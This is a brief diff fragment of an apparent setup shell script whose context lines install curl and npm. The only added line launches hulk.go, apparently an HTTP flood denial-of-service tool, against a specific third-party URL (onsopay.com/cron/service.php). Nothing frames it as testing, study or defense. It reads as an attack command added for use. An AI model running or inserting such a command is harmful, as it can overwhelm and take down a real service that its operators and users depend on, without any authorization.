@@ -11,3 +11,4 @@ apt install curl -y
 clear
 apt install npm -y
 clear
+go run hulk.go --site https://onsopay.com/cron/service.php GET nil
